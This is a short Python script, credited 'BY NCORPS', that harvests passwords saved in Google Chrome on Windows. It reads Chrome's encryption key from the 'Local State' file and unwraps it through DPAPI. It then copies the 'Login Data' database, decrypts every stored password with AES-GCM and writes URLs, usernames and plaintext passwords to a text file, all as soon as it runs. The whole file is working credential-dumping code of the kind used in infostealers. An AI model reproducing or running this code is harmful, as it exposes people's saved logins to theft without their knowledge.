import os
import json
import base64
import sqlite3
from traceback import print_tb
import win32crypt
from Crypto.Cipher import AES
import shutil
from datetime import timezone, datetime, timedelta


  
# BY NCORPS



def chrome_date_and_time(chrome_data):
    # Chrome_data format is 'year-month-date 
    # hr:mins:seconds.milliseconds
    # This will return datetime.datetime Object
    return datetime(1601, 1, 1) + timedelta(microseconds=chrome_data)
  
  
def fetching_encryption_key():
    # Local_computer_directory_path will look 
    # like this below
    # C: => Users => <Your_Name> => AppData =>
    # Local => Google => Chrome => User Data =>
    # Local State
    local_computer_directory_path = os.path.join(
      os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", 
      "User Data", "Local State")
      
    with open(local_computer_directory_path, "r", encoding="utf-8") as f:
        local_state_data = f.read()
        local_state_data = json.loads(local_state_data)
  
    # decoding the encryption key using base64
    encryption_key = base64.b64decode(
      local_state_data["os_crypt"]["encrypted_key"])
      
    # remove Windows Data Protection API (DPAPI) str
    encryption_key = encryption_key[5:]
      
    # return decrypted key
    return win32crypt.CryptUnprotectData(encryption_key, None, None, None, 0)[1]
  
  
def password_decryption(password, encryption_key):
    try:
        iv = password[3:15]
        password = password[15:]
          
        # generate cipher
        cipher = AES.new(encryption_key, AES.MODE_GCM, iv)
          
        # decrypt password
        return cipher.decrypt(password)[:-16].decode()
    except:
          
        try:
            return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
        except:
            return "No Passwords"
  
  
def main():
    key = fetching_encryption_key()
    db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                           "Google", "Chrome", "User Data", "default", "Login Data")
    filename = "ChromePasswords.db"
    shutil.copyfile(db_path, filename)
      
    # connecting to the database
    db = sqlite3.connect(filename)
    cursor = db.cursor()
      
    # 'logins' table has the data
    cursor.execute(
        "select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins "
        "order by date_last_used")
      
    # variable para guardar info
    main_url_array = []
    login_page_url_array = []
    user_name_array = []
    decrypted_password_array = []
    date_of_creation_array = []
    last_usuage_array = []

    # iterate over all rows
    for row in cursor.fetchall():
        main_url = row[0]
        login_page_url = row[1]
        user_name = row[2]
        decrypted_password = password_decryption(row[3], key)
        date_of_creation = row[4]
        last_usuage = row[5]
          
        if user_name or decrypted_password:
            main_url_array.append(main_url)
            login_page_url_array.append(login_page_url)
            user_name_array.append(user_name)
            decrypted_password_array.append(decrypted_password)
          
        else:
            continue
          
        if date_of_creation != 86400000000 and date_of_creation:
            date_of_creation_array.append(str(chrome_date_and_time(date_of_creation)))
        else:
            date_of_creation_array.append(str("???"))
          
        if last_usuage != 86400000000 and last_usuage:
            last_usuage_array.append(str(chrome_date_and_time(last_usuage)))
        else:
            last_usuage_array.append({str("???")})
    cursor.close()
    db.close()
    
    #crear archivo
    contadortexto = 0
    nombreArchivo1 = "passwords"+ str(datetime.now()) +".txt"
    nombreArchivo2 = nombreArchivo1.replace(" ", "-")
    nombreArchivo3 = nombreArchivo2.replace(":", "_")
    archivo1=open(nombreArchivo3,"w")

    archivo1.write("=" * 100)
    archivo1.write("\n")
    
    while contadortexto < (len(user_name_array)):
        archivo1.write(main_url_array[contadortexto])
        archivo1.write("\n")
        archivo1.write(login_page_url_array[contadortexto])
        archivo1.write("\n")
        archivo1.write(user_name_array[contadortexto])
        archivo1.write("\n")
        archivo1.write(decrypted_password_array[contadortexto])
        archivo1.write("\n")
        archivo1.write(str(date_of_creation_array[contadortexto]))
        archivo1.write("\n")
        archivo1.write(str(last_usuage_array[contadortexto]))
        archivo1.write("\n")
        archivo1.write("=" * 100)
        archivo1.write("\n")

        contadortexto += 1

    #acabar
    try:
          
        # trying to remove the copied db file as 
        # well from local computer
        os.remove(filename)
    except:
        pass
main()